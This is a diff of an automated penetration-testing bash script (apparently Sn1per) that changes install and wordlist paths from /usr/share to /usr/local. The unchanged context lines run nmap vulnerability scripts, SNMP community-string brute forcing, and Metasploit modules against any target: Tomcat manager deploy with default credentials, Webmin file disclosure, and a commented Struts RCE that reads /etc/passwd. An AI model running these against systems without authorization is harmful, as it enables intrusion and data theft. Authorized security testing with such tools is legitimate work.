@@ -86,17 +86,17 @@ TARGET="$1"
 MODE="$2"
 OPT1="$3"
 DISABLE_POSTGRESQL="true" # disabling postgresql startup, assuming it's running already
-INSTALL_DIR="/usr/share/sniper"
-LOOT_DIR="/usr/share/sniper/loot"
-PLUGINS_DIR="/usr/share/sniper/plugins"
-CMSMAP="/usr/share/sniper/plugins/CMSmap/cmsmap.py"
-SAMRDUMP="/usr/share/sniper/bin/samrdump.py"
-DNSDICT6="/usr/share/sniper/bin/dnsdict6"
-INURLBR="/usr/share/sniper/bin/inurlbr.php"
-USER_FILE="/usr/share/brutex/wordlists/simple-users.txt"
-PASS_FILE="/usr/share/brutex/wordlists/password.lst"
-DNS_FILE="/usr/share/brutex/wordlists/namelist.txt"
-SUPER_MICRO_SCAN="/usr/share/sniper/plugins/SuperMicro-Password-Scanner/supermicro_scan.sh"
+INSTALL_DIR="/usr/local/sniper"
+LOOT_DIR="/usr/local/sniper/loot"
+PLUGINS_DIR="/usr/local/sniper/plugins"
+CMSMAP="/usr/local/sniper/plugins/CMSmap/cmsmap.py"
+SAMRDUMP="/usr/local/sniper/bin/samrdump.py"
+DNSDICT6="/usr/local/sniper/bin/dnsdict6"
+INURLBR="/usr/local/sniper/bin/inurlbr.php"
+USER_FILE="/usr/local/brutex/wordlists/simple-users.txt"
+PASS_FILE="/usr/local/brutex/wordlists/password.lst"
+DNS_FILE="/usr/local/brutex/wordlists/namelist.txt"
+SUPER_MICRO_SCAN="/usr/local/sniper/plugins/SuperMicro-Password-Scanner/supermicro_scan.sh"
 DEFAULT_PORTS="21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,623,624,1099,1433,1524,2049,2121,3128,3306,3310,3389,3632,4443,5432,5800,5900,5984,6667,8000,8009,8080,8180,8443,8888,10000,16992,27017,27018,27019,28017,49152,U:53,U:67,U:68,U:88,U:161,U:162,U:137,U:138,U:139,U:389,U:520,U:2049"
 DEFAULT_TCP_PORTS="21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,623,624,1099,1433,1524,2049,2121,3128,3306,3310,3389,3632,4443,5432,5800,5900,5984,6667,8000,8009,8080,8180,8443,8888,10000,16992,27017,27018,27019,28017,49152"
 DEFAULT_UDP_PORTS="53,67,68,88,161,162,137,138,139,389,520,2049"
@@ -194,7 +194,7 @@ function loot {
 		mv $a $LOOT_DIR/output/
 	done
 	echo -e "$OKORANGE + -- --=[Removing blank web screenshots...$RESET"
-	find /usr/share/sniper/loot/screenshots/ -size -10k -exec rm -f {} \; 2> /dev/null
+	find /usr/local/sniper/loot/screenshots/ -size -10k -exec rm -f {} \; 2> /dev/null
 	rm -f $LOOT_DIR/.fuse_* 2> /dev/null
 	echo -e "$OKORANGE + -- --=[Starting Metasploit service...$RESET"
 	/etc/init.d/metasploit start 2> /dev/null
@@ -963,7 +963,7 @@ else
 	then
 		echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
 		echo -e "$OKGREEN + -- ----------------------------=[Running NMap HTTP Scripts]=--------------- -- +$RESET"
-		nmap -A -Pn -T5 -p 80 -sV --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse --script=http-enum,http-headers,http-server-header,http-php-version,http-iis-webdav-vuln,http-vuln-*,http-phpmyadmin-dir-traversal $TARGET
+		nmap -A -Pn -T5 -p 80 -sV --script=/usr/local/nmap/scripts/http-vuln-cve2017-5638.nse --script=/usr/local/nmap/scripts/iis-buffer-overflow.nse --script=http-enum,http-headers,http-server-header,http-php-version,http-iis-webdav-vuln,http-vuln-*,http-phpmyadmin-dir-traversal $TARGET
 		echo -e "$OKGREEN + -- ----------------------------=[Running Directory Brute Force]=----------- -- +$RESET"
 		dirb http://$TARGET
 		echo -e "$OKGREEN + -- ----------------------------=[Running Wordpress Vulnerability Scans]=--- -- +$RESET"
@@ -1054,7 +1054,7 @@ then
 	echo -e "$OKRED + -- --=[Port 161 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 161 opened... running tests...$RESET"
-	for a in `cat /usr/share/brutex/wordlists/snmp-strings.txt`; do snmpwalk $TARGET -c $a; done;
+	for a in `cat /usr/local/brutex/wordlists/snmp-strings.txt`; do snmpwalk $TARGET -c $a; done;
 	nmap -sU -p 161 --script=snmp* $TARGET
 fi
 
@@ -1063,7 +1063,7 @@ then
 	echo -e "$OKRED + -- --=[Port 162 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 162 opened... running tests...$RESET"
-	for a in `cat /usr/share/brutex/wordlists/snmp-strings.txt`; do snmpwalk $TARGET -c $a; done;
+	for a in `cat /usr/local/brutex/wordlists/snmp-strings.txt`; do snmpwalk $TARGET -c $a; done;
 	nmap -A -p 162 -Pn --script=snmp* $TARGET
 fi
 
@@ -1154,7 +1154,7 @@ else
 	if [ "$MODE" = "web" ];
 	then
 		echo -e "$OKGREEN + -- ----------------------------=[Running NMap HTTP Scripts]=--------------- -- +$RESET"
-		nmap -A -sV -T5 -Pn -p 443 --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse --script=http-enum,http-headers,http-server-header,http-php-version,http-iis-webdav-vuln,http-vuln-*,http-phpmyadmin-dir-traversal $TARGET
+		nmap -A -sV -T5 -Pn -p 443 --script=/usr/local/nmap/scripts/http-vuln-cve2017-5638.nse --script=/usr/local/nmap/scripts/iis-buffer-overflow.nse --script=http-enum,http-headers,http-server-header,http-php-version,http-iis-webdav-vuln,http-vuln-*,http-phpmyadmin-dir-traversal $TARGET
 		echo -e "$OKGREEN + -- ----------------------------=[Running Directory Brute Force]=----------- -- +$RESET"
 		dirb https://$TARGET
 		echo -e "$OKGREEN + -- ----------------------------=[Running Wordpress Vulnerability Scans]=--- -- +$RESET"
@@ -1250,7 +1250,7 @@ then
 else
 	echo -e "$OKORANGE + -- --=[Port 623 opened... running tests...$RESET"
 	amap $TARGET 623 -A
-	nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 623 $TARGET
+	nmap -A -sV -Pn -T5 --script=/usr/local/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 623 $TARGET
 fi
 
 if [ -z "$port_624" ];
@@ -1259,7 +1259,7 @@ then
 else
 	echo -e "$OKORANGE + -- --=[Port 624 opened... running tests...$RESET"
 	amap $TARGET 624 -A
-	nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 624 $TARGET
+	nmap -A -sV -Pn -T5 --script=/usr/local/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 624 $TARGET
 fi
 
 if [ -z "$port_1099" ];
@@ -1428,7 +1428,7 @@ else
 	cd ..
 	nikto -h http://$TARGET:8000 
 	cutycapt --url=http://$TARGET:8000 --out=$LOOT_DIR/screenshots/$TARGET-port8000.jpg
-	nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8000 -T5 $TARGET
+	nmap -sV -Pn --script=/usr/local/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8000 -T5 $TARGET
 fi
 
 if [ -z "$port_8100" ];
@@ -1447,7 +1447,7 @@ else
 	cd $INSTALL_DIR
 	nikto -h http://$TARGET:8100 
 	cutycapt --url=http://$TARGET:8100 --out=$LOOT_DIR/screenshots/$TARGET-port8100.jpg
-	nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8100 -T5 $TARGET
+	nmap -sV -Pn --script=/usr/local/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8100 -T5 $TARGET
 fi
 
 if [ -z "$port_8080" ];
@@ -1466,7 +1466,7 @@ else
 	cd $INSTALL_DIR
 	nikto -h http://$TARGET:8080 
 	cutycapt --url=http://$TARGET:8080 --out=$LOOT_DIR/screenshots/$TARGET-port8080.jpg
-	nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8080 -T5 --script=*proxy* $TARGET
+	nmap -sV -Pn --script=/usr/local/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8080 -T5 --script=*proxy* $TARGET
 	msfconsole -x "use admin/http/jboss_bshdeployer; setg RHOST "$TARGET"; run; use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
 	# EXPERIMENTAL - APACHE STRUTS RCE EXPLOIT
 	# msfconsole -x "use exploit/linux/http/apache_struts_rce_2016-3081; setg RHOSTS "$TARGET"; set PAYLOAD linux/x86/read_file; set PATH /etc/passwd; run;"
@@ -1489,7 +1489,7 @@ else
 	cd $INSTALL_DIR
 	nikto -h http://$TARGET:8180 
 	cutycapt --url=http://$TARGET:8180 --out=$LOOT_DIR/screenshots/$TARGET-port8180.jpg
-	nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -p 8180 -T5 --script=*proxy* $TARGET
+	nmap -sV -Pn --script=/usr/local/nmap/scripts/http-vuln-cve2017-5638.nse -p 8180 -T5 --script=*proxy* $TARGET
 	echo -e "$OKGREEN + -- ----------------------------=[Launching Webmin File Disclosure Exploit]= -- +$RESET"
 	msfconsole -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
 	echo -e "$OKGREEN + -- ----------------------------=[Launching Tomcat Exploits]=--------------- -- +$RESET"
@@ -1513,7 +1513,7 @@ else
 	cd $INSTALL_DIR
 	nikto -h https://$TARGET:8443 
 	cutycapt --url=https://$TARGET:8443 --out=$LOOT_DIR/screenshots/$TARGET-port8443.jpg
-	nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8443 -T5 --script=*proxy* $TARGET
+	nmap -sV -Pn --script=/usr/local/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8443 -T5 --script=*proxy* $TARGET
 fi
 
 if [ -z "$port_8888" ];
@@ -1528,7 +1528,7 @@ else
 	xsstracer $TARGET 8888
 	nikto -h http://$TARGET:8888 
 	cutycapt --url=https://$TARGET:8888 --out=$LOOT_DIR/screenshots/$TARGET-port8888.jpg
-	nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse  -A -p 8888 -T5 $TARGET
+	nmap -sV -Pn --script=/usr/local/nmap/scripts/http-vuln-cve2017-5638.nse  -A -p 8888 -T5 $TARGET
 fi
 
 if [ -z "$port_10000" ];
@@ -1547,7 +1547,7 @@ then
 else
 	echo -e "$OKORANGE + -- --=[Port 16992 opened... running tests...$RESET"
 	amap $TARGET 16992 -A
-	nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 16992 $TARGET
+	nmap -A -sV -Pn -T5 --script=/usr/local/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 16992 $TARGET
 fi
 
 if [ -z "$port_27017" ];
